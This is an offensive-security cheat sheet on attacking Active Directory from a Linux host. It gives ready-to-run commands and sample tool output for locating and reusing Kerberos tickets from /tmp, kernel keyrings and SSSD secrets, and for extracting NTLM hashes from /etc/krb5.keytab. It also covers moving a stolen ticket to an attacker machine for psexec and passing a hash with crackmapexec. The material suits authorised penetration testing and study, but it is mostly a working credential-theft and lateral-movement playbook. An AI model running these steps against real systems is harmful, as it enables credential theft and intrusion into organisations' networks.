# Linux Active Directory

## Enumeration
#### Check if Linux host is AD Joined
- Check for file ```krb5.conf```
```
ls -lsa /etc/krb5.conf
cat /etc/krb5.conf
``` 

#### Check for keytab files
- And check who can acces the keytab files
- A keytab is a file containing pairs of Kerberos principals and encrypted keys that are derived from the Kerberos password. The most common use of keytab files is to allow scripts to authenticate to Kerberos without human interaction or without storing the password in a plain text file.
```
ls -lsa /etc/krb5.keytab

find / -name *.keytab*
ls -lsa <PATH TO FILE>
```

#### Check for ticket files
- Are normally stored in ```/tmp```
- Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
- To find the location where they are stored check the config file ```/etc/krb5.conf```
```
ls /tmp/ | grep krb5cc
```

#### Kernel Keys
- If tickets aren't saved in files they are saved in Linux Kernel Keys
- Can use https://github.com/TarlogicSecurity/tickey to convert them to files

## Reusing and abusing ccache
### CCACHE ticket reuse from /tmp
- When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in ```/tmp``` and scoped with 600 permissions

#### List the current ticket used for authentication 
```
env | grep KRB5CCNAME
````

#### Reuuse ticket
```
export KRB5CCNAME=/tmp/ticket.ccache
```

### CCACHE ticket reuse from Kernel Keys
- Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
```
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```

### CCACHE ticket reuse from SSSD KCM
- https://github.com/fireeye/SSSDKCMExtractor
- SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
- The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
- By default, the key is only readable if you have **root** permissions.
- Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.
```
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

- The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.


### CCACHE ticket reuse from keytab
- https://github.com/its-a-feature/KeytabParser
```
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

#### Manually use keytab file
- Request CIFS TGS to abuse it with secretsdump or psexec on attacking machine
```
kinit -k -t <KEYTAB FILE> <USER>
kvno CIFS/\<DC NAME>
klist
base64 </tmp/TICKET CACHE>

# ON ATTACKER MACHINE
echo "<BASE64 STRING>" | base64 -d > ticket.ccache
export KRB5CCNAME=ticket.ccache
python3 psexec -k -no-pass 
```


### Extract accounts from /etc/krb5.keytab
- The service keys used by services that run as root are usually stored in the keytab file ```/etc/krb5.keytab```. This service key is the equivalent of the service's password, and must be kept secure. 

Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.

```
$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```

#### KeytabExtract
- On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.

```
python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```

#### Connect to the machine with CME.
```
crackmapexec <IP> -u '<COMPUTER ACCOUNT $>' -H "<HASH>" -d <DOMAIN> 
```
